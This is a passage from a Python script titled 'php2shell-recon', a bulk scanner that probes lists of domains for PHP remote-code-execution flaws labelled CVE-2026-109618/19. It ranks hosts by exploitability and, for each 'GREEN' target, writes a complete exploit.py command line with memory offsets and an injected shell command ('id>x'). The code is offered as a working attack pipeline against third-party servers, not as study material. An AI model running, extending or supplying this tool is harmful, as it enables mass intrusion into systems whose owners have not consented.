                if r.verdict != "GREEN" or not r.suggested_exploit_args:
                    continue
                a = r.suggested_exploit_args
                f.write(
                    f"python3 exploit.py {a.get('-u','')} "
                    f"--offsets-file '' "
                    f"--zif-offset {a.get('--zif-offset','0x465370')} "
                    f"--dtor-offset {a.get('--dtor-offset','0x65eb60')} "
                    f"--huge-mb {a.get('--huge-mb',12)} "
                    f"--retries 30 --proof-file '' "
                    f"--fetch {a.get('--fetch','/x')} -c 'id>x'\n")
        if self.args.summary:
            with open(self.args.summary, "w", newline="",
                      encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow(["verdict", "host", "php_version", "score"])
                for r in sorted(self.results,
                                key=lambda x: -x.exploitability_score):
                    w.writerow([r.verdict, r.host,
                                r.php_version or "", r.exploitability_score])
        if not self.args.quiet:
            print(f"Results: {self.args.out}", flush=True)
            print("Green targets: green_targets.txt", flush=True)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell-recon: bulk target scanner for CVE-2026-109618/19")
    ap.add_argument("--input", required=True, help="domain list (one per line)")
    ap.add_argument("--out", default="results.jsonl",
                    help="output JSONL (overwrites unless --jsonl-append is used)")
    ap.add_argument("--concurrency", type=int, default=30)
    ap.add_argument("--timeout", type=float, default=12)
    ap.add_argument("--retries", type=int, default=2)
    ap.add_argument("--ua", default=None)
    ap.add_argument("--insecure", action="store_true",
                     help="disable TLS certificate verification")
    ap.add_argument("--rate", type=float, default=0,
                     help="N requests per second per host (0=unlimited)")
    ap.add_argument("--probe-budget", type=int, default=24,
                     help="maximum N probes per host")
    ap.add_argument("--jsonl-append", action="store_true",
                     help="append to the existing JSONL file")
    ap.add_argument("--max-body", type=int, default=2_000_000,
                     help="response body limit (bytes)")
    ap.add_argument("--include-http", action="store_true",
                    help="include explicit HTTP targets (default: skip them)")
    ap.add_argument("--no-tls-fallback", action="store_true",
                     help="fall back to HTTP on TLS errors")
    ap.add_argument("--summary", default=None,
                    help="summary CSV path")
    ap.add_argument("--proxy", default=None,
                    help="HTTP proxy (http://...)")
    ap.add_argument("--probe-memory", action="store_true",
                    help="allow the P2 memory_limit probe")
    ap.add_argument("--probe-post-max", action="store_true",
                    help="allow the P1 post_max_size probe")
    ap.add_argument("-q", "--quiet", action="store_true",
                     help="quiet mode")
    args = ap.parse_args()

    drv = Driver(args)
    try:
        asyncio.run(drv.run())
    except KeyboardInterrupt:
        if not args.quiet:
            print("\n[!] Interrupted", flush=True)
    drv.summarize()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
